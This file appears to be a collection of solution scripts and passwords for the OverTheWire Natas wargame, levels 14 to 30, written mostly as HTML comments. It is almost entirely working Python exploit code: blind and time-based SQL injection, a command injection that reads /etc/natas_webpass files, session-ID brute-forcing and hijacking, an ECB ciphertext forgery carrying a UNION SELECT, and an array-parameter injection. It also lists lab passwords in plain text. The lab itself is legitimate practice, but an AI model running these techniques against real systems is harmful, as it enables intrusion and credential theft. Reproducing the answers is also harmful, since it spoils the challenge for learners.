HERE IS THE SOME OF THE LASTEST NATAS LEVELS PASSWORDS AND SOLUTION


<!--LEVEL 14 -> 15
<!-- import requests -->

<!-- chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" -->
<!-- 
password = "hPkjKYvi"
url = "http://natas15.natas.labs.overthewire.org/index.php"

basic_user = "natas15"
basic_pass = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
while len(password) <= 32:
    for testing in chars:
        data = {"username": f'natas16" AND password LIKE BINARY "{password + testing}%" #'}
        resp = requests.post(url, data=data, auth=(basic_user, basic_pass))
    
        if "This user exists." in resp.text:
            password += testing
            print(f"Current password: {password}")
            break -->

<!-- print(f"Final password: {password}") -->



<!-- NATAS16->17  -->

<!-- import requests

# Characters to test for the password
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# Starting with known prefix (if any)
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
# URL and authentication
url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

while len(password) < 32:
    for char in chars:
        print(f"Testing character: {char}")
        # Crafting the payload to inject into the `needle` parameter
        payload = f"$(grep ^{password}{char} /etc/natas_webpass/natas17)"
        response = requests.get(url, auth=auth, params={"needle": payload, "submit": "Search"})
        # Checking if the injected command did not return "Americanisms"
        if "Americanisms" not in response.text:
            # If the response does not contain "Americanisms", it means the prefix is correct
            password += char
            print(f"Found so far: {password}")
            break

print(f"Password for natas17: {password}")
 -->

<!-- next one -->

<!-- # natas 17-> 18

# import requests

# # Initialization
# password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
# chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
# url = "http://natas17.natas.labs.overthewire.org/"

# # Loop until the password length reaches 32 characters
# while len(password) < 32:
#     print(f"Till now password is: {password}")
#     print("Testing for ", end='')
#     for char in chars:
#         print(char, end="", flush=True)
#         data = {'username': f'natas18" and password like binary "{password}{char}%" and sleep(20) -- '}
        
#         try:
#             # Sending the POST request
#             response = requests.post(url, data=data, auth=auth, timeout=10)
#         except requests.exceptions.ReadTimeout:
#             # If a ReadTimeout exception occurs, it means the password is correct up to the current character
#             password += char
#             print("")
#             break
        
# print(f"Finished! Password is {password}") -->


<!-- natas 18 -> 19 -->

<!-- import requests


auth = ("natas18","6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
url = "http://natas18.natas.labs.overthewire.org/index.php"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"

for i in range(1,640):
    cookies = {"PHPSESSID": str(i) }
    response = requests.get(url, auth=auth, cookies=cookies )
    print(i)
    
    if "regular user" not in response.text:
        print(response.text) -->





<!-- natas 19 -> 20 -->

<!-- 
import requests

def hex2ascii(s):
    ret = ""
    for c in s:
        coded = hex(ord(c))[2:]
        if len(coded) == 1:
            coded = '0' + coded  # Ensure two characters per byte
        ret += coded
    return ret

auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
url = "http://natas19.natas.labs.overthewire.org/index.php"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

for i in range(1, 640):
    session_id = hex2ascii(f"{i}-admin")
    cookies = {"PHPSESSID": session_id}
    res = requests.get(url, auth=auth, cookies=cookies)
    
    print(i, session_id)
    
    if "regular user" not in res.text:
        print(res.text)
        break  # Exit the loop once the correct session is found
 -->




<!-- natas 21->22



import requests

target = 'http://natas21.natas.labs.overthewire.org'
auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')

exp_tar='http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'


#First POST request to get session of admin from exp_tar
session=requests.Session()
response = session.post(exp_tar, auth=auth)
admin_session = session.cookies['PHPSESSID']
print(response.text)


#Second request to be admin
response = requests.get(target, auth=auth,cookies={"PHPSESSID":admin_session})
print(response.text)



 -->





<!-- natas 27 -> 28 -->

<!-- 




import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

# First we generate a baseline for the header/footer
data = {'query':10 * ' '}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# We generate the ciphertext query and parse the result
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query':sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# We computer the size of our payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Then, we forge the query
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = s.get(search_url, params={"query":final_ciphertext})

print(resp.text)





 -->

<!-- natas 29 -> 30  -->


<!-- 

import requests

auth = ('natas30','WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
data = {'password':'ali', 'username': ["'%' or 1 # ", 2]}
url = 'http://natas30.natas.labs.overthewire.org'

answer =  requests.post(url, data=data , auth=auth).text
print(answer)


 -->

<!-- last levels password update 2024 -->



<!-- natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -->
<!-- natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj -->
<!-- natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns -->
<!-- natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH -->
<!-- <!-- natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y -->
<!-- <!-- natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B -->
<!-- <!-- natas34:j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY -->



 


